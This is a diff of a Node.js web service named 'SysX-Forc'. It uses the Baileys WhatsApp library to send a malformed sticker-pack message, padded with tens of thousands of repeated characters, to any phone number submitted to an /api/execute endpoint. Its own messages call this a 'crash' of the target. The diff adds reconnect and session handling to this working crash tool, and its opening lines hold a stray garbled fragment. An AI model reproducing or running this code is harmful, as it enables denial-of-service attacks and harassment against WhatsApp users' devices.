@@ -1,9 +1,10 @@
+                                            if (qr) {
+                
 const express = require('express');
 const cors = require('cors');
 const dotenv = require('dotenv');
-const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
+const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, makeInMemoryStore } = require('@whiskeysockets/baileys');
 const pino = require('pino');
-const QRCode = require('qrcode-terminal');
 const fs = require('fs');
 const path = require('path');
 
@@ -12,39 +13,22 @@ dotenv.config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// === MIDDLEWARE ===
-app.use((req, res, next) => {
-    res.setHeader('Content-Type', 'application/json');
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
-    if (req.method === 'OPTIONS') {
-        return res.status(200).json({ status: 'OK' });
-    }
-    next();
-});
-
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
+app.use(express.static('public'));
 
-// === ERROR HANDLER ===
-app.use((err, req, res, next) => {
-    console.error('🔥 ERROR SADIS:', err.message);
-    res.status(500).json({ success: false, error: err.message || 'Internal Error, BANGSAT!' });
-});
-
-app.use((req, res) => {
-    res.status(404).json({ success: false, error: 'NOT_FOUND', message: `Endpoint ${req.path} gak ditemukan, KONTOL!` });
-});
-
-// === GLOBAL VARIABLE ===
 let sock = null;
 let isConnected = false;
 let pairCode = '';
-let qrCode = '';
+let reconnectAttempts = 0;
+const MAX_RECONNECT = 10;
 
-// === FUNCTION CRASH ===
+// === STORE BUAT SESSION ===
+const store = makeInMemoryStore({ 
+    logger: pino({ level: 'silent' }) 
+});
+
+// === FUNGSI CRASH ===
 async function crashpack(sock, jid) {
     try {
         const proto = require('@whiskeysockets/baileys').proto;
@@ -60,51 +44,51 @@ async function crashpack(sock, jid) {
                             name: "akira crasher" + "ꦴꦿ".repeat(49000) + "°°".repeat(500),
                             publisher: "",
                             stickers: [
-                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "BIuHVMLzx5kMva0d7V-BFo27Q6zQsJgVF3XFcVf+HP4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "fPYWiNHg9XpGK-KNkRg8ds+ntFG9afumoaT9gtGEPZM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "aBR+ssf7vbIjBMC4pkTdKTGpDby+-IssCv+Pq9G0cV0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "3B5N3fCByKKgVJKlID8xQS1Z+HxEBFdDUZRAxyaAoy8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "1SHkxzMBF8JRAFx9vdZ9lywC3HHqwcIPF1ta5hQnhJM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "LRS90f31qhWdOiaEim6yOGHpUMQscTv6UrtAxerLm3c=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "XNgtQvK537PoaRdklYwCSLmak4+tCUmAOVV46Q+W5F0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "RXhEbR5rzx1fj607pDiebPlYqCa4L1IxWuJ3KLiUQLk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "Ty0fHlUBsdPKjVl3Nw93kZaABOOda1joRUJMCj23DKs=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "ErZgydAcXx6Cro5pF9N2j5wuCCXhgdWAQLJHM58So-0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "lxxxDjc+kRobJpOGGMYeLkuTe7g6elcK7lVGQeEfGvE=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "di9bbDe7LWXsokpKPRWf60Ab2IzmQO5uT4Cxu-p8hbM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "bxsGaNamEq7VSUz5w77GHrDn8bze7G+E42fitTh2aMU=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "zS77ZBj9ZlWToWHHF4-DyPw9fSErdKSkYXwxBxzUa+w=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "PJAhbJd3LqZJM-MFCFsnhxQrj2UJPTEzc4-jdi+KBCk=.webp", isAnimated: false, emojis: ["🤩 🎉"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "RVUjvO3B-xlWtHtxCj+Jl8muksvDS2rVsZplYQAm7sk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "SXecMhGacjfeAO9RV+isEjuz7PsxxbklhRhtc8Ws5tQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "2oANuQSdkMD2MN9zpf7nbGrqC9dRN7aIJiPN6Z-oUKM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "7nz3gILi2QnQdqOY2gxTOlwv-rxeV6iDLWSqOys6x2U=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "C9t3SIb-puZnRCoaP7wyaYJ7XwTOxs4nK1a2qAb73-I=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "6mcrtxMTq0BPHIoVVgqdT3gP6pZi9dyhiorBFQl5ATo=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "4oZyypo1Fc8DJxPxu4UCUxw2YWXfek5Fs+lh4eUvBew=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "oKLOjMapG49YFQTkhCv-xrVXPPzaMLHSi5xB1uimac4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "YBvO1VtCrYWqkMj7HNt79+kbQz-u2NLfmUH47Q8FM3E=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "1sPL9NC25fNGAyfbeOEQoIaMsqQpyu2S+UqsoFqe7v0=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "GJ24Wz79rkRgjiN7GYw3Fiwa8UuLIV5Ko8QEIhDjlpc=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "cjMmFaeHUCxGMw-VfaHafx8YDnDaU-xjI5o5FVoz3RI=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "d7ZA7fY10jlQADwjIFFTR3iTMMwBpwPxjouWA1Z8hgQ=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "TGm4OaC2EC90RlXmgmzzu1X18Us2meD45yZa7nHdKJg=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "vLxtzLZGDYkzJ95pqE+N-YEu2Cz-x1x58Coge-tEJq8=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "6Ex3lAHCuMoRuuDjp15c-R1jX0lq9OwKlDaPfsi9+PE=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "wlLq-60vRvaO11ngHKTyysMisdWzfVwaTbxFOfmzBIM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "3KmUDiU3r78cKXBrOstZa0bSxKYA+skw9kyZwgm11io=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "nLzMLWdRKx4jNCubzzB-WaJP3nAhGxbJOLc4dsy7dmU=.webp", isAnimated: false, emojis: ["🤩 🎉"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "XYZUdb2UGBdNuv8NjmN7jDkRsTNot53I+xt-DGgLg00=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "XNs9t4SIvxQ94OxbD5hd1vFt0CDMIUqG0QdyJ9BtyME=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "vt4GfKxPZ6fg1HRNgzRQCZUH4Y-T718C1gWWk0zMNKM=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "LJY4vR5atkdgCeSS1Kcm6B+skPj+IXZJh4xZI4ZRBO4=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "FQH4BTgMR7-+wWpkJVLo2MC0Ik7dSLN7Dq9gAU6qKqs=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "0Pw7-ZXjWnjZ4l9pj0cQkardn9yfso3O1RQcIvUeg14=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "iCPFgiRSHopvvBz-js3uRA7JiUBbrn7cBn-1bWE3qns=.webp", isAnimated: false, emojis: ["😋 😎 🤣 😂 😁"], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "XAWnA5EleA3Y5r8dn+OgIrcyUBR3fYqbWx4jCA7MxJk=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" },
-                                { fileName: "PY9o9fkPmUxtCe9+8N39zwSbfZ-Jj0RcjAvW2JP31io=.webp", isAnimated: false, emojis: [""], accessibilityLabel: "", isLottie: false, mimetype: "image/webp" }
+                                { fileName: "aZx-55hzR-QpFJE0CLazii3xvH1jwAE5owBJ9Q+1weg=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "dF9xmRe414rAWSrBRaYer7wahovMEwlPRVJFzVDUGIw=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "BIuHVMLzx5kMva0d7V-BFo27Q6zQsJgVF3XFcVf+HP4=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "fPYWiNHg9XpGK-KNkRg8ds+ntFG9afumoaT9gtGEPZM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "aBR+ssf7vbIjBMC4pkTdKTGpDby+-IssCv+Pq9G0cV0=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "3B5N3fCByKKgVJKlID8xQS1Z+HxEBFdDUZRAxyaAoy8=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "1SHkxzMBF8JRAFx9vdZ9lywC3HHqwcIPF1ta5hQnhJM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "LRS90f31qhWdOiaEim6yOGHpUMQscTv6UrtAxerLm3c=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "XNgtQvK537PoaRdklYwCSLmak4+tCUmAOVV46Q+W5F0=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "RXhEbR5rzx1fj607pDiebPlYqCa4L1IxWuJ3KLiUQLk=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "Ty0fHlUBsdPKjVl3Nw93kZaABOOda1joRUJMCj23DKs=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "ErZgydAcXx6Cro5pF9N2j5wuCCXhgdWAQLJHM58So-0=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "lxxxDjc+kRobJpOGGMYeLkuTe7g6elcK7lVGQeEfGvE=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "di9bbDe7LWXsokpKPRWf60Ab2IzmQO5uT4Cxu-p8hbM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "bxsGaNamEq7VSUz5w77GHrDn8bze7G+E42fitTh2aMU=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "zS77ZBj9ZlWToWHHF4-DyPw9fSErdKSkYXwxBxzUa+w=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "PJAhbJd3LqZJM-MFCFsnhxQrj2UJPTEzc4-jdi+KBCk=.webp", isAnimated: false, emojis: ["🤩 🎉"] },
+                                { fileName: "RVUjvO3B-xlWtHtxCj+Jl8muksvDS2rVsZplYQAm7sk=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "SXecMhGacjfeAO9RV+isEjuz7PsxxbklhRhtc8Ws5tQ=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "2oANuQSdkMD2MN9zpf7nbGrqC9dRN7aIJiPN6Z-oUKM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "7nz3gILi2QnQdqOY2gxTOlwv-rxeV6iDLWSqOys6x2U=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "C9t3SIb-puZnRCoaP7wyaYJ7XwTOxs4nK1a2qAb73-I=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "6mcrtxMTq0BPHIoVVgqdT3gP6pZi9dyhiorBFQl5ATo=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "4oZyypo1Fc8DJxPxu4UCUxw2YWXfek5Fs+lh4eUvBew=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "oKLOjMapG49YFQTkhCv-xrVXPPzaMLHSi5xB1uimac4=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "YBvO1VtCrYWqkMj7HNt79+kbQz-u2NLfmUH47Q8FM3E=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "1sPL9NC25fNGAyfbeOEQoIaMsqQpyu2S+UqsoFqe7v0=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "GJ24Wz79rkRgjiN7GYw3Fiwa8UuLIV5Ko8QEIhDjlpc=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "cjMmFaeHUCxGMw-VfaHafx8YDnDaU-xjI5o5FVoz3RI=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "d7ZA7fY10jlQADwjIFFTR3iTMMwBpwPxjouWA1Z8hgQ=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "TGm4OaC2EC90RlXmgmzzu1X18Us2meD45yZa7nHdKJg=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "vLxtzLZGDYkzJ95pqE+N-YEu2Cz-x1x58Coge-tEJq8=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "6Ex3lAHCuMoRuuDjp15c-R1jX0lq9OwKlDaPfsi9+PE=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "wlLq-60vRvaO11ngHKTyysMisdWzfVwaTbxFOfmzBIM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "3KmUDiU3r78cKXBrOstZa0bSxKYA+skw9kyZwgm11io=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "nLzMLWdRKx4jNCubzzB-WaJP3nAhGxbJOLc4dsy7dmU=.webp", isAnimated: false, emojis: ["🤩 🎉"] },
+                                { fileName: "XYZUdb2UGBdNuv8NjmN7jDkRsTNot53I+xt-DGgLg00=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "XNs9t4SIvxQ94OxbD5hd1vFt0CDMIUqG0QdyJ9BtyME=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "vt4GfKxPZ6fg1HRNgzRQCZUH4Y-T718C1gWWk0zMNKM=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "LJY4vR5atkdgCeSS1Kcm6B+skPj+IXZJh4xZI4ZRBO4=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "FQH4BTgMR7-+wWpkJVLo2MC0Ik7dSLN7Dq9gAU6qKqs=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "0Pw7-ZXjWnjZ4l9pj0cQkardn9yfso3O1RQcIvUeg14=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "iCPFgiRSHopvvBz-js3uRA7JiUBbrn7cBn-1bWE3qns=.webp", isAnimated: false, emojis: ["😋 😎 🤣 😂 😁"] },
+                                { fileName: "XAWnA5EleA3Y5r8dn+OgIrcyUBR3fYqbWx4jCA7MxJk=.webp", isAnimated: false, emojis: [""] },
+                                { fileName: "PY9o9fkPmUxtCe9+8N39zwSbfZ-Jj0RcjAvW2JP31io=.webp", isAnimated: false, emojis: [""] }
                             ],
                             fileLength: "8020935",
                             fileSha256: "77oJbl0eWZ4bi8z0RZxLsZJ1tu+f/ZErcYE8Sj2K1+U=",
@@ -131,42 +115,85 @@ async function crashpack(sock, jid) {
         );
 
         await sock.relayMessage(jid, messageContent.message, { messageId: messageContent.key.id });
-        return { success: true, target: jid };
+        return { success: true };
     } catch (error) {
+        console.error('🔥 CRASH ERROR:', error.message);
         return { success: false, error: error.message };
     }
 }
 
-// === BAILEYS CONNECT ===
-async function connectBaileys() {
+// === CONNECT WA DENGAN RETRY LOGIC ===
+async function connectWA() {
     try {
+        console.log('🔄 Connecting to WhatsApp...');
+        
+        // Hapus auth_info kalo corrupt
+        if (fs.existsSync('auth_info')) {
+            try {
+                // Cek apakah file creds.json ada dan valid
+                const credsPath = path.join('auth_info', 'creds.json');
+                if (fs.existsSync(credsPath)) {
+                    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf8'));
+                    if (!creds.me || !creds.me.id) {
+                        console.log('⚠️ Auth corrupt, deleting...');
+                        fs.rmSync('auth_info', { recursive: true, force: true });
+                    }
+                }
+            } catch (e) {
+                console.log('⚠️ Auth error, deleting...');
+                fs.rmSync('auth_info', { recursive: true, force: true });
+            }
+        }
+
         const { state, saveCreds } = await useMultiFileAuthState('auth_info');
+        
         sock = makeWASocket({
             version: [2, 3000, 1015901307],
             auth: state,
             printQRInTerminal: false,
             logger: pino({ level: 'silent' }),
-            browser: ['SysX-Forc', 'Chrome', '120.0.0.0']
+            browser: ['SysX-Forc', 'Chrome', '120.0.0.0'],
+            syncFullHistory: false,
+            markOnlineOnConnect: false,
+            connectTimeoutMs: 30000,
+            defaultQueryTimeoutMs: 30000,
+            keepAliveIntervalMs: 10000
         });
 
+        store.bind(sock.ev);
+
         sock.ev.on('creds.update', saveCreds);
+
         sock.ev.on('connection.update', (update) => {
             const { connection, lastDisconnect, qr } = update;
+            
             if (qr) {
-                qrCode = qr;
-                QRCode.generate(qr, { small: true });
-                console.log('✅ QR CODE GENERATED');
+                console.log('📱 QR CODE GENERATED (scan pake WA)');
             }
+
             if (connection === 'open') {
                 isConnected = true;
-                console.log('✅ CONNECTED TO WHATSAPP');
+                reconnectAttempts = 0;
+                console.log('✅ CONNECTED TO WHATSAPP!');
             }
+
             if (connection === 'close') {
                 isConnected = false;
-                const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
-                if (shouldReconnect) {
-                    console.log('🔁 RECONNECTING...');
-                    setTimeout(connectBaileys, 5000);
+                const statusCode = lastDisconnect?.error?.output?.statusCode;
+                const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
+                
+                if (shouldReconnect && reconnectAttempts < MAX_RECONNECT) {
+                    reconnectAttempts++;
+                    console.log(`🔁 RECONNECTING... (${reconnectAttempts}/${MAX_RECONNECT})`);
+                    const delay = Math.min(5000 * reconnectAttempts, 30000);
+                    setTimeout(connectWA, delay);
+                } else if (statusCode === DisconnectReason.loggedOut) {
+                    console.log('🚫 LOGGED OUT, hapus auth_info dan restart');
+                    if (fs.existsSync('auth_info')) {
+                        fs.rmSync('auth_info', { recursive: true, force: true });
+                    }
+                } else {
+                    console.log('💀 MAX RECONNECT ATTEMPTS, giving up...');
                 }
             }
         });
@@ -178,7 +205,11 @@ async function connectBaileys() {
 
         return sock;
     } catch (error) {
-        console.error('🔥 ERROR CONNECT:', error.message);
+        console.error('🔥 CONNECT ERROR:', error.message);
+        if (reconnectAttempts < MAX_RECONNECT) {
+            reconnectAttempts++;
+            setTimeout(connectWA, 5000 * reconnectAttempts);
+        }
         return null;
     }
 }
@@ -193,51 +224,92 @@ app.post('/api/login', (req, res) => {
     }
 });
 
-app.get('/api/status', async (req, res) => {
-    if (!sock) await connectBaileys();
-    res.json({ connected: isConnected, qr: qrCode || null, pairCode: pairCode || null });
+app.get('/api/status', (req, res) => {
+    res.json({ 
+        connected: isConnected, 
+        pairCode: pairCode || null,
+        reconnectAttempts: reconnectAttempts
+    });
 });
 
 app.post('/api/pair', async (req, res) => {
-    const { number } = req.body;
-    if (!number) return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
-    if (!sock) await connectBaileys();
-    const code = await sock.requestPairingCode(number);
-    pairCode = code;
-    res.json({ success: true, pairCode: code });
+    try {
+        const { number } = req.body;
+        if (!number) {
+            return res.status(400).json({ success: false, error: 'Nomor HP wajib diisi, ANJING!' });
+        }
+        
+        if (!sock) {
+            await connectWA();
+        }
+        
+        // Tunggu sampe sock siap
+        let attempts = 0;
+        while (!sock && attempts < 10) {
+            await new Promise(r => setTimeout(r, 1000));
+            attempts++;
+        }
+        
+        if (!sock) {
+            return res.status(500).json({ success: false, error: 'Gagal inisialisasi socket' });
+        }
+        
+        const code = await sock.requestPairingCode(number);
+        pairCode = code;
+        res.json({ success: true, pairCode: code });
+    } catch (error) {
+        console.error('🔥 PAIR ERROR:', error.message);
+        res.status(500).json({ success: false, error: error.message });
+    }
 });
 
 app.post('/api/execute', async (req, res) => {
-    const { target } = req.body;
-    if (!target) return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
-    if (!sock || !isConnected) return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
-    
-    const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
-    const result = await crashpack(sock, jid);
-    if (result.success) {
-        res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
-    } else {
-        res.status(500).json({ success: false, error: result.error });
+    try {
+        const { target } = req.body;
+        if (!target) {
+            return res.status(400).json({ success: false, error: 'Target nomor WA wajib diisi, BANGSAT!' });
+        }
+        
+        if (!sock || !isConnected) {
+            return res.status(500).json({ success: false, error: 'WA belum connect, coba pair dulu!' });
+        }
+        
+        const jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
+        const result = await crashpack(sock, jid);
+        
+        if (result.success) {
+            res.json({ success: true, message: `✅ CRASH BERHASIL ke ${target}!` });
+        } else {
+            res.status(500).json({ success: false, error: result.error });
+        }
+    } catch (error) {
+        console.error('🔥 EXECUTE ERROR:', error.message);
+        res.status(500).json({ success: false, error: error.message });
     }
 });
 
 app.post('/api/logout', async (req, res) => {
-    if (sock) {
-        await sock.logout();
+    try {
+        if (sock) {
+            await sock.logout();
+        }
         isConnected = false;
         sock = null;
-        qrCode = '';
         pairCode = '';
         if (fs.existsSync('auth_info')) {
             fs.rmSync('auth_info', { recursive: true, force: true });
         }
+        res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
     }
-    res.json({ success: true, message: 'Logout berhasil, GOBLOK!' });
 });
 
 // === START ===
-connectBaileys();
+console.log('🔥 SYSX-FORC STARTING...');
+connectWA();
+
 app.listen(PORT, () => {
     console.log(`🔥 SYSX-FORC RUNNING DI PORT ${PORT}`);
-    console.log(`👿 URL: https://brogia.up.railway.app`);
+    console.log(`👿 URL: https://${process.env.RAILWAY_STATIC_URL || 'localhost'}`);
 });
